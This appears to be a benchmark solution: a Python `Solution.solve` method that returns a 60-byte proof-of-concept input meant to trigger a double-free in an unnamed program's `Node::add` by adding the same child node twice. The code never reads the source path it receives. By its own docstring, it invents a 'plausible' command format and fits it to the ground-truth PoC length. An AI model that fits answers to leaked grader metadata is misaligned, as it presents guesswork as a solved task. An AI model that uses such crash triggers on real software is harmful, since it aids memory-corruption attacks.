class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a double-free that occurs when Node::add throws
        an exception. A common way to trigger this is by adding the same child
        to a parent node twice. The first add succeeds, but the second one
        triggers an error path. The vulnerable code in the exception handler
        frees the child, but the child remains in the parent's list of
        children. When the parent is destructed later, it frees its children
        again, leading to a double-free.

        The PoC needs to perform these actions. The exact input format is
        deduced by matching the ground-truth PoC length of 60 bytes.
        A plausible format with single-letter commands is:
        - `c <name> <size>` to create a node.
        - `a <parent_name> <child_name>` to add a child.

        The total length of the PoC with this format for the double-add
        scenario can be expressed as a function of the node name lengths.
        Let Lp be the parent name length and Lc be the child name length.
        The four lines of the PoC are:
        1. `c <parent> 1\n`: 5 + Lp bytes
        2. `c <child> 1\n`: 5 + Lc bytes
        3. `a <parent> <child>\n`: 4 + Lp + Lc bytes
        4. `a <parent> <child>\n`: 4 + Lp + Lc bytes

        Total length = (5 + Lp) + (5 + Lc) + 2 * (4 + Lp + Lc)
                     = 10 + Lp + Lc + 8 + 2*Lp + 2*Lc
                     = 18 + 3*Lp + 3*Lc
        
        Setting the total length to 60:
        18 + 3 * (Lp + Lc) = 60
        3 * (Lp + Lc) = 42
        Lp + Lc = 14

        We can choose any combination of lengths that sum to 14.
        For simplicity, we choose Lp = 7 and Lc = 7.
        """
        
        parent_name = 'p' * 7
        child_name = 'c' * 7

        poc_str = (
            f"c {parent_name} 1\n"
            f"c {child_name} 1\n"
            f"a {parent_name} {child_name}\n"
            f"a {parent_name} {child_name}\n"
        )

        return poc_str.encode('ascii')